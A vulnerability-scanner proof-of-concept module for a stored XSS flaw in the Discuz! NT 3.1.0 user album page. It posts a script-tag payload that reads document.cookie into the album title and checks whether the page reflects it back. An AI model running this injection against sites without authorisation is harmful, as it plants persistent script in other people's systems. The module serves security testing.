# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0005'  # 平台漏洞编号，留空
    name = 'Discuz! NT3.1.0 用户相册存储型XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2015-04-25'  # 漏洞公布时间
    desc = '''
        Discuz! NT3.1.0 用户相册存储型XSS漏洞。
        /usercpspacemanagealbum.aspx?page=1&mod=edit&albumid=32
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Discuz! NT3.1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '30703d92-b695-428c-987c-4db0d1eca92a'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            session = requests.Session()
            path = '/usercpspacemanagealbum.aspx?page=1&mod=edit&albumid=32'
            UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36'
            Referer = '/usercpspacemanagealbum.aspx?page=1&mod=edit&albumid=32'
            payload = '''<script>console.log(document.cookie)</script>'''

            username = ''
            password = ''
            Host = self.target
            Url = Host + path
            Referer_url = self.target + Referer

            Auth = requests.auth.HTTPBasicAuth(username, password)

            PostData = {
                'albumtitle': payload,
                'albumid': '302',
                'active': '',
                'albumcate': '2',
                'albumdescription': '',
                'type': 0,
                'password': '',
                'Submit': '确定'}
            Header = {'User-Agent': UA, 'Referer': Referer_url,
                      'X-Requested-With': 'XMLHttpRequest'}

            # Login and get session
            session.get(Url, data=PostData, auth=Auth, headers=Header)
            # post editor to dz
            session.post(Url, data=PostData, headers=Header)
            # get result
            r = session.get(
                '{}/usercpspacemanagealbum.aspx'.format(Host), headers=Header)
            if payload in r.text:
                #args['success'] = True
                #args['poc_ret']['vul_url'] = Url
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            return None

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
